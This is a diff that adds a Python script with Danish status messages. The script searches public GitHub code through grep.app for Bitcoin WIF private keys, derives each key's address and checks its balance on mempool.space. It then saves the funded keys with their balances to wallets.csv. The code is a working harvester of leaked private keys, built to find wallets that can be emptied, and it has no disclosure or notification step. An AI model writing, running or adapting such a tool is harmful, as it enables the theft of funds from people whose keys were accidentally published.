@@ -1,0 +1,64 @@
+import re, time, hashlib, csv, concurrent.futures as cf
+import requests, base58
+from coincurve import PrivateKey
+
+RE_WIF = r"\b[5KL][1-9A-HJ-NP-Za-km-z]{50,51}\b"
+
+def sha256(b): return hashlib.sha256(b).digest()
+def hash160(b): return hashlib.new("ripemd160", sha256(b)).digest()
+def b58check(p): return base58.b58encode(p + sha256(sha256(p))[:4]).decode()
+
+def wif_to_address(w):
+    raw = base58.b58decode_check(w)
+    comp = (len(raw) == 34)
+    pk = int.from_bytes(raw[1:33], "big")
+    pub = PrivateKey.from_int(pk).public_key.format(comp)
+    return b58check(b"\x00" + hash160(pub))
+
+def search_wifs(pages=5):
+    out = set()
+    for p in range(1, pages + 1):
+        r = requests.get("https://grep.app/api/search",
+                         params={"q": RE_WIF, "regexp": "true", "page": p},
+                         headers={"User-Agent": "hunt"}, timeout=30)
+        hits = r.json().get("hits", {}).get("hits", [])
+        if not hits: break
+        for h in hits:
+            sn = re.sub(r"<[^>]+>", "", h.get("content", {}).get("snippet", ""))
+            out.update(re.findall(RE_WIF, sn))
+        time.sleep(0.5)
+    return out
+
+def balance(addr):
+    try:
+        s = requests.get(f"https://mempool.space/api/address/{addr}",
+                         timeout=15).json()["chain_stats"]
+        return s["funded_txo_sum"] - s["spent_txo_sum"]
+    except Exception:
+        return 0
+
+print("Trin 1: soeger WIF-noegler paa GitHub ...")
+wifs = search_wifs()
+print(f"  fandt {len(wifs)} kandidater")
+
+print("Trin 2: udleder adresser og tjekker saldo ...")
+rows = []
+with cf.ThreadPoolExecutor(max_workers=8) as ex:
+    fut = {ex.submit(wif_to_address, w): w for w in wifs}
+    for f in cf.as_completed(fut):
+        w = fut[f]
+        try:
+            a = f.result()
+        except Exception:
+            continue
+        b = balance(a)
+        if b > 0:
+            print(f"  FUND: {a}  {b} satoshi  noegle={w}")
+            rows.append([a, w, b])
+
+rows.sort(key=lambda r: -r[2])
+with open("wallets.csv", "w", newline="") as f:
+    c = csv.writer(f)
+    c.writerow(["address", "wif", "satoshis"])
+    c.writerows(rows)
+print(f"Faerdig: {len(rows)} noegler med saldo -> wallets.csv")
